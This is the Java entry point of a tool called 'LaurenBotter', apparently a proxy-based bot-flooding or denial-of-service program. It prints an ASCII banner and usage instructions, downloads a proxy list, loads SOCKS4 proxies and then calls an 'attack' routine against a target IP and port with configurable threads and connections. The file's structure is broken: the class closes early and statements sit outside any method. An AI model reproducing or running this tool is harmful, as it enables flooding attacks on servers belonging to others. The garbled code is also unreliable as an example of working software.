// 
// Todos los derechos reservados a Daniel.Arvizu.Rosselli
// 
package me.arvizu.laurenbotter;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URL;
import me.arvizu.laurenbotter.Proxies;
import me.arvizu.laurenbotter.proxieslokas;
import me.arvizu.laurenbotter.RandomOptions;
import me.arvizu.laurenbotter.opciones.options;

public class MenuPrincipal {

    private static Proxies proxies;
    
  }
      
      System.out.println("");
              System.out.println(Colores.ANSI_RED +"$$\\                                                        $$$$$$$\\             $$\\     $$\\                         \n" +
Colores.ANSI_RED+"$$ |                                                       $$  __$$\\            $$ |    $$ |                        \n" +
Colores.ANSI_RED+"$$ |      $$$$$$\\  $$\\   $$\\  $$$$$$\\   $$$$$$\\  $$$$$$$\\  $$ |  $$ | $$$$$$\\ $$$$$$\\ $$$$$$\\    $$$$$$\\   $$$$$$\\  \n" +
Colores.ANSI_RED+"$$ |      \\____$$\\ $$ |  $$ |$$  __$$\\ $$  __$$\\ $$  __$$\\ $$$$$$$\\ |$$  __$$\\\\_$$  _|\\_$$  _|  $$  __$$\\ $$  __$$\\ \n" +
Colores.ANSI_RED+"$$ |      $$$$$$$ |$$ |  $$ |$$ |  \\__|$$$$$$$$ |$$ |  $$ |$$  __$$\\ $$ /  $$ | $$ |    $$ |    $$$$$$$$ |$$ |  \\__|\n" +
Colores.ANSI_RED+"$$ |     $$  __$$ |$$ |  $$ |$$ |      $$   ____|$$ |  $$ |$$ |  $$ |$$ |  $$ | $$ |$$\\ $$ |$$\\ $$   ____|$$ |      \n" +
Colores.ANSI_RED+"$$$$$$$$\\\\$$$$$$$ |\\$$$$$$  |$$ |      \\$$$$$$$\\ $$ |  $$ |$$$$$$$  |\\$$$$$$  | \\$$$$  |\\$$$$  |\\$$$$$$$\\ $$ |      \n" +
Colores.ANSI_RED+"\\________|\\_______| \\______/ \\__|       \\_______|\\__|  \\__|\\_______/  \\______/   \\____/  \\____/  \\_______|\\__|      \n" +
Colores.ANSI_RED+"" +
"                                                                                                                    \n" +
Colores.ANSI_CYAN +"                              >>>>>>>>>>>"+Colores.ANSI_PURPLE +"[PUBLIC]"+Colores.ANSI_CYAN+"<<<<<<<<<<<<<");
              System.out.println(Colores.ANSI_CYAN +"         Welcome to" + Colores.ANSI_YELLOW +" LaurenBotter" + Colores.ANSI_CYAN +" 0.2 by" + Colores.ANSI_PURPLE+" Daniel.Arvizu.Rosselli#7777" +Colores.ANSI_YELLOW+" B4RC0DE EXPOSED");
              System.out.println(Colores.ANSI_PURPLE +"                           [Contact Me] -->" +Colores.ANSI_CYAN +" discord.bio/p/arvizu");
              System.out.println();
              System.out.println(Colores.ANSI_GREEN + "[Help]");
	      System.out.println(Colores.ANSI_RED +"#########################################################################");
	      System.out.println(Colores.ANSI_YELLOW+"java -jar LaurenBotter.jar <ip:port> <threads> <connections> lauren.txt");
	      System.out.println(Colores.ANSI_RED +"#########################################################################");
              System.out.println("");
	      System.out.println(Colores.ANSI_CYAN+"www.cipher-bot.me");
              System.out.println("");
              proxieslokas.downloadFile(proxies);
    if (args.length != 4)
      return; 
    String ip = args[0].split(":")[0];
    int port = Integer.parseInt(args[0].split(":")[1]);
    int threads = Integer.parseInt(args[1]);
    int connections = Integer.parseInt(args[2]);
    String proxy = args[3];
    try {
      ProxyManager proxyManager = new ProxyManager();
      if (proxyManager.loadProxy(proxy)) {
        Bot botAttack = new Bot(ip, port, proxyManager);
        botAttack.attack(threads, connections);
      } else {
          System.out.println(Colores.ANSI_RED + "[!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!]");
          System.out.println(Colores.ANSI_YELLOW +"[!]Make sure to put valid proxies SOCKS4");
          System.out.println(Colores.ANSI_RED +"[!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!]");
      } 
      
    } catch (FileNotFoundException e) {
      e.printStackTrace();
    } 
  }
}
